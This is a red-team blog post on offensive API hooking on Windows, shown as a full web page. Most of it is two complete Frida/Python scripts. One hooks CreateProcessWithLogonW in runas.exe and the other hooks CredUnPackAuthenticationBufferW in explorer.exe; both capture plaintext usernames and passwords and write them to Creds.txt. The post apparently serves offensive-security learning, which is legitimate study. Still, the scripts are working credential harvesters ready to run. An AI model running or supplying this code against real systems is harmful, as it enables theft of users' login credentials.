<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="pv-cache-enabled" content="false"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Offensive API Hooking" /><meta name="author" content="Ilan Kalendarov" /><meta property="og:locale" content="en_US" /><meta name="description" content="Introduction" /><meta property="og:description" content="Introduction" /><link rel="canonical" href="https://ilankalendarov.github.io/posts/offensive-hooking/" /><meta property="og:url" content="https://ilankalendarov.github.io/posts/offensive-hooking/" /><meta property="og:site_name" content="Ilan Kalendarov" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-02-11T08:10:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Offensive API Hooking" /><meta name="twitter:site" content="@IKalendarov" /><meta name="twitter:creator" content="@Ilan Kalendarov" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"Ilan Kalendarov"},"headline":"Offensive API Hooking","dateModified":"2021-02-11T20:16:54+02:00","datePublished":"2021-02-11T08:10:00+02:00","description":"Introduction","url":"https://ilankalendarov.github.io/posts/offensive-hooking/","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://ilankalendarov.github.io/posts/offensive-hooking/"},"@context":"https://schema.org"}</script><title>Offensive API Hooking | Ilan Kalendarov</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-0DPQ73MMWM"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-0DPQ73MMWM'); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://avatars.githubusercontent.com/u/43996999?s=400&u=fb96811b93e9b2083c6c2bac70cf1eb4d918a11d&v=4" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Ilan Kalendarov</a></div><div class="site-subtitle font-italic">A Offensive Security Blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/IlanKalendarov" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/IKalendarov" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Offensive API Hooking</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Offensive API Hooking</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Feb 11, 2021, 8:10 AM +0200" > Feb 11, 2021 <i class="unloaded">2021-02-11T08:10:00+02:00</i> </span> by <span class="author"> Ilan Kalendarov </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Thu, Feb 11, 2021, 8:16 PM +0200" > Feb 11, 2021 <i class="unloaded">2021-02-11T20:16:54+02:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2396 words">13 min</span></div></div><div class="post-content"><h2 id="introduction">Introduction</h2><hr /><p>Hooking is not a new concept as we know by now, many AV/EDR vendors use this technique to monitor suspicious API calls. In this blog post, we’ll explore API hooking but from the offensive point of view. We’ll use API Monitor to investigate which API calls used by each program then, using Frida and python to build our final hooking script. This post is inspired by the Red Teaming Experiments <a href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/instrumenting-windows-apis-with-frida">blog post.</a></p><h2 id="api-monitor">API Monitor</h2><hr /><p>Api Monitor is a great tool for… you guessed it, monitoring api calls. You can find it <a href="http://www.rohitab.com/downloads">here</a>.</p><p>Firing up Api Monitor this will be the main screen:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/ApiMonitorHomeScreen.png" alt="" /></p><p>As you can see I’ve chosen all library options therefore, I would able to catch most of the API possibilities. Let’s start by monitoring a new process, I’ll choose <code class="language-plaintext highlighter-rouge">runas.exe</code> first.</p><p>According to Microsoft docs:</p><blockquote><p>It allows a user to run specific tools and programs with different permissions than the user’s current logon provides.</p></blockquote><p>Looks good to me as a start.</p><p>Opening runas and trying to login as a different user gives us the above API call:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/RunasAPICall.png" alt="" /></p><p>Great so we know that the <code class="language-plaintext highlighter-rouge">CreateProcessWithLogonW</code> api call contains our secret password. Looking at the <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw">microsoft docs </a> we could see that the first and third arguments will store the username and password. Now that we have that information let’s build our script!.</p><h2 id="frida">Frida</h2><hr /><p>According to Frida’s site:</p><blockquote><p>It’s <a href="https://addons.mozilla.org/en-US/firefox/addon/greasemonkey/">Greasemonkey</a> for native apps, or, put in more technical terms, it’s a dynamic code instrumentation toolkit. It lets you inject snippets of JavaScript or your own library into native apps on Windows, macOS, GNU/Linux, iOS, Android, and QNX. Frida also provides you with some simple tools built on top of the Frida API. These can be used as-is, tweaked to your needs, or serve as examples of how to use the API.</p></blockquote><p>We’ll be able to build a JavaScript snippet that takes the function name from the DLL library - <code class="language-plaintext highlighter-rouge">Advapi.dll</code>. The script should look like this:</p><div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">CreateProcessWithLogonW</span> <span class="o">=</span> <span class="nx">Module</span><span class="p">.</span><span class="nx">findExportByName</span><span class="p">(</span><span class="dl">"</span><span class="s2">Advapi32.dll</span><span class="dl">"</span><span class="p">,</span> <span class="dl">'</span><span class="s1">CreateProcessWithLogonW</span><span class="dl">'</span><span class="p">)</span> <span class="c1">// exporting the function from the dll library</span>

<span class="nx">Interceptor</span><span class="p">.</span><span class="nx">attach</span><span class="p">(</span><span class="nx">CreateProcessWithLogonW</span><span class="p">,</span> <span class="p">{</span> <span class="c1">// getting our juice arguments (according to microsoft docs)</span>
	<span class="na">onEnter</span><span class="p">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">args</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">this</span><span class="p">.</span><span class="nx">lpUsername</span> <span class="o">=</span> <span class="nx">args</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
		<span class="k">this</span><span class="p">.</span><span class="nx">lpDomain</span> <span class="o">=</span> <span class="nx">args</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
		<span class="k">this</span><span class="p">.</span><span class="nx">lpPassword</span> <span class="o">=</span> <span class="nx">args</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
		<span class="k">this</span><span class="p">.</span><span class="nx">lpCommandLine</span> <span class="o">=</span> <span class="nx">args</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
	<span class="p">},</span>
	<span class="na">onLeave</span><span class="p">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">args</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// getting the plain text credentials </span>
		<span class="nx">send</span><span class="p">(</span><span class="dl">"</span><span class="se">\\</span><span class="s2">n=============================</span><span class="dl">"</span> <span class="o">+</span> <span class="dl">"</span><span class="se">\\</span><span class="s2">n[+] Retrieving Creds from RunAs..</span><span class="dl">"</span> <span class="o">+</span><span class="dl">"</span><span class="se">\\</span><span class="s2">n Username    : </span><span class="dl">"</span> <span class="o">+</span> <span class="k">this</span><span class="p">.</span><span class="nx">lpUsername</span><span class="p">.</span><span class="nx">readUtf16String</span><span class="p">()</span> <span class="o">+</span> <span class="dl">"</span><span class="se">\\</span><span class="s2">nCommandline : </span><span class="dl">"</span> <span class="o">+</span> <span class="k">this</span><span class="p">.</span><span class="nx">lpCommandLine</span><span class="p">.</span><span class="nx">readUtf16String</span><span class="p">()</span> <span class="o">+</span> <span class="dl">"</span><span class="se">\\</span><span class="s2">nDomain      : </span><span class="dl">"</span> <span class="o">+</span> <span class="k">this</span><span class="p">.</span><span class="nx">lpDomain</span><span class="p">.</span><span class="nx">readUtf16String</span><span class="p">()</span> <span class="o">+</span> <span class="dl">"</span><span class="se">\\</span><span class="s2">nPassword    : </span><span class="dl">"</span> <span class="o">+</span> <span class="k">this</span><span class="p">.</span><span class="nx">lpPassword</span><span class="p">.</span><span class="nx">readUtf16String</span><span class="p">()</span><span class="o">+</span> <span class="dl">"</span><span class="se">\\</span><span class="s2">n=============================</span><span class="dl">"</span><span class="p">);</span>

	<span class="p">}</span>
<span class="p">});</span>
</pre></table></code></div></div><p>Now, all left to do is to insert the JavaScript snippet into a python script, The final python script should look like this:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
</pre><td class="rouge-code"><pre><span class="c1"># Wrriten by Ilan Kalendarov
</span>
<span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">print_function</span>
<span class="kn">import</span> <span class="nn">frida</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
<span class="kn">import</span> <span class="nn">psutil</span>
<span class="kn">from</span> <span class="nn">threading</span> <span class="kn">import</span> <span class="n">Lock</span><span class="p">,</span> <span class="n">Thread</span>

<span class="c1"># Locking the runas thread to prevent other threads
#interfering with our current session
</span><span class="n">lockRunas</span> <span class="o">=</span> <span class="n">Lock</span><span class="p">()</span>  

<span class="k">def</span> <span class="nf">on_message_runas</span><span class="p">(</span><span class="n">message</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
	<span class="c1"># Executes when the user enters the password.
</span>	<span class="c1"># Then, open the txt file and append the data.
</span>	<span class="k">print</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">message</span><span class="p">[</span><span class="s">'type'</span><span class="p">]</span> <span class="o">==</span> <span class="s">"send"</span><span class="p">:</span>
		<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"Creds.txt"</span><span class="p">,</span> <span class="s">"a"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
			<span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">message</span><span class="p">[</span><span class="s">"payload"</span><span class="p">]</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
		<span class="k">try</span><span class="p">:</span>
			<span class="n">lockRunas</span><span class="p">.</span><span class="n">release</span><span class="p">()</span>
			<span class="k">print</span><span class="p">(</span><span class="s">"[+] released"</span><span class="p">)</span>
		<span class="k">except</span> <span class="nb">Exception</span><span class="p">:</span>
			<span class="k">pass</span>


<span class="k">def</span> <span class="nf">WaitForRunAs</span><span class="p">():</span>
	<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
		<span class="c1"># Trying to find if runas is running if so, execute the "RunAs" function.
</span>		<span class="k">if</span> <span class="p">(</span><span class="s">"runas.exe"</span> <span class="ow">in</span> <span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">name</span><span class="p">()</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">psutil</span><span class="p">.</span><span class="n">process_iter</span><span class="p">()))</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">lockRunas</span><span class="p">.</span><span class="n">locked</span><span class="p">():</span>
			<span class="n">lockRunas</span><span class="p">.</span><span class="n">acquire</span><span class="p">()</span> <span class="c1"># Locking the runas thread
</span>			<span class="k">print</span><span class="p">(</span><span class="s">"[+] Found RunAs"</span><span class="p">)</span>
			<span class="n">RunAs</span><span class="p">()</span>
			<span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>

		<span class="c1"># If the user regret and they "ctrl+c" from runas then release the thread lock and start over.
</span>		<span class="k">elif</span> <span class="p">(</span><span class="ow">not</span> <span class="s">"runas.exe"</span> <span class="ow">in</span> <span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">name</span><span class="p">()</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">psutil</span><span class="p">.</span><span class="n">process_iter</span><span class="p">()))</span> <span class="ow">and</span> <span class="n">lockRunas</span><span class="p">.</span><span class="n">locked</span><span class="p">():</span>
			<span class="n">lockRunas</span><span class="p">.</span><span class="n">release</span><span class="p">()</span>
			<span class="k">print</span><span class="p">(</span><span class="s">"[+] Runas is dead releasing lock"</span><span class="p">)</span>
		<span class="k">else</span><span class="p">:</span>
			<span class="k">pass</span>
		<span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">RunAs</span><span class="p">():</span>
	<span class="k">try</span><span class="p">:</span>
		<span class="c1"># Attaching to the runas process
</span>		<span class="k">print</span><span class="p">(</span><span class="s">"[+] Trying To Attach To Runas"</span><span class="p">)</span>
		<span class="n">session</span> <span class="o">=</span> <span class="n">frida</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="s">"runas.exe"</span><span class="p">)</span>
		<span class="k">print</span><span class="p">(</span><span class="s">"[+] Attached runas!"</span><span class="p">)</span>

		<span class="c1"># Executing the following javascript
</span>		<span class="c1"># We Listen to the CreateProcessWithLogonW func from Advapi32.dll to catch the username,password,domain and the executing program 		  in plain text.
</span>		<span class="n">script</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">create_script</span><span class="p">(</span><span class="s">"""

		var CreateProcessWithLogonW = Module.findExportByName("Advapi32.dll", 'CreateProcessWithLogonW') // exporting the function from 		the dll library
		Interceptor.attach(CreateProcessWithLogonW, { // getting our juice arguments (according to microsoft docs)
			onEnter: function (args) {
				this.lpUsername = args[0];
				this.lpDomain = args[1];
				this.lpPassword = args[2];
				this.lpCommandLine = args[5];
			},
			onLeave: function (args) { // getting the plain text credentials 
				send("</span><span class="se">\\</span><span class="s">n=============================" + "</span><span class="se">\\</span><span class="s">n[+] Retrieving Creds from RunAs.." +"</span><span class="se">\\</span><span class="s">n Username    : " + this.lpUsername.readUtf16String() + "</span><span class="se">\\</span><span class="s">nCommandline : " + this.lpCommandLine.readUtf16String() + "</span><span class="se">\\</span><span class="s">nDomain      : " + this.lpDomain.readUtf16String() + "</span><span class="se">\\</span><span class="s">nPassword    : " + this.lpPassword.readUtf16String()+ "</span><span class="se">\\</span><span class="s">n=============================");

			}
		});

		"""</span><span class="p">)</span>

		<span class="c1"># If we got a hit then execute the "on_message_runas" function
</span>		<span class="n">script</span><span class="p">.</span><span class="n">on</span><span class="p">(</span><span class="s">'message'</span><span class="p">,</span> <span class="n">on_message_runas</span><span class="p">)</span>
		<span class="n">script</span><span class="p">.</span><span class="n">load</span><span class="p">()</span>
	<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
		<span class="k">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
	<span class="n">thread</span> <span class="o">=</span> <span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">WaitForRunAs</span><span class="p">)</span>
	<span class="n">thread</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
</pre></table></code></div></div><p>Great! lets try to run the script:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/RunasScript.png" alt="" /></p><h2 id="credentials-prompt--aka-graphical-runas">Credentials Prompt (A.K.A Graphical Runas)</h2><hr /><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/GraphicalRunas.png" alt="" /></p><p>At this point, it’s pretty easy, Implementing the steps as we did with the CLI version of runas. Let’s fire up API Monitor. Using the process locator option in API Monitor we could see that the process is <code class="language-plaintext highlighter-rouge">explorer.exe</code>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/processLocator.png" alt="" /></p><p>Using the steps like we did before I was able to find that the function <code class="language-plaintext highlighter-rouge">CredUnPackAuthenticationBufferW</code> from <code class="language-plaintext highlighter-rouge">Credui.dll</code> was called.</p><p>According to Microsoft docs:</p><blockquote><p>The CredUnPackAuthenticationBuffer function converts an authentication buffer returned by a call to the <a href="https://docs.microsoft.com/en-us/windows/desktop/api/wincred/nf-wincred-creduipromptforwindowscredentialsa">CredUIPromptForWindowsCredentials</a> function into a string user name and password.</p></blockquote><p>All left to do is to write our JavaScript and python scripts, Final script should look like this:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
</pre><td class="rouge-code"><pre><span class="c1"># Wrriten by Ilan Kalendarov
</span>
<span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">print_function</span>
<span class="kn">import</span> <span class="nn">frida</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
<span class="kn">import</span> <span class="nn">psutil</span>
<span class="kn">from</span> <span class="nn">threading</span> <span class="kn">import</span> <span class="n">Lock</span><span class="p">,</span> <span class="n">Thread</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="k">def</span> <span class="nf">on_message_credui</span><span class="p">(</span><span class="n">message</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
	<span class="c1"># Executes when the user enters the credentials inside the Graphical runas prompt.
</span>	<span class="c1"># Then, open a txt file and appends the data.
</span>	<span class="k">print</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">message</span><span class="p">[</span><span class="s">'type'</span><span class="p">]</span> <span class="o">==</span> <span class="s">"send"</span><span class="p">:</span>
		<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"Creds.txt"</span><span class="p">,</span> <span class="s">"a"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
			<span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">message</span><span class="p">[</span><span class="s">"payload"</span><span class="p">]</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">CredUI</span><span class="p">():</span>
	<span class="c1"># Explorer is always running so no while loop is needed.
</span>
	<span class="c1"># Attaching to the explorer process
</span>	<span class="n">session</span> <span class="o">=</span> <span class="n">frida</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="s">"explorer.exe"</span><span class="p">)</span>

	<span class="c1"># Executing the following javascript
</span>	<span class="c1"># We Listen to the CredUnPackAuthenticationBufferW func from Credui.dll to catch the user and pass in plain text
</span>	<span class="n">script</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">create_script</span><span class="p">(</span><span class="s">"""

	var username;
	var password;
	var CredUnPackAuthenticationBufferW = Module.findExportByName("Credui.dll", "CredUnPackAuthenticationBufferW")

	Interceptor.attach(CredUnPackAuthenticationBufferW, {
		onEnter: function (args) 
		{

			username = args[3];
			password = args[7];
		},
		onLeave: function (result)
		{
		   
			var user = username.readUtf16String()
			var pass = password.readUtf16String()

			if (user &amp;&amp; pass)
			{
				send("</span><span class="se">\\</span><span class="s">n+ Intercepted CredUI Credentials</span><span class="se">\\</span><span class="s">n" + user + ":" + pass)
			}
		}
	});

	"""</span><span class="p">)</span>
	<span class="c1"># If we found the user and pass then execute "on_message_credui" function
</span>	<span class="n">script</span><span class="p">.</span><span class="n">on</span><span class="p">(</span><span class="s">'message'</span><span class="p">,</span> <span class="n">on_message_credui</span><span class="p">)</span>
	<span class="n">script</span><span class="p">.</span><span class="n">load</span><span class="p">()</span>
	<span class="n">sys</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
    
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
	<span class="n">CredUI</span><span class="p">()</span>
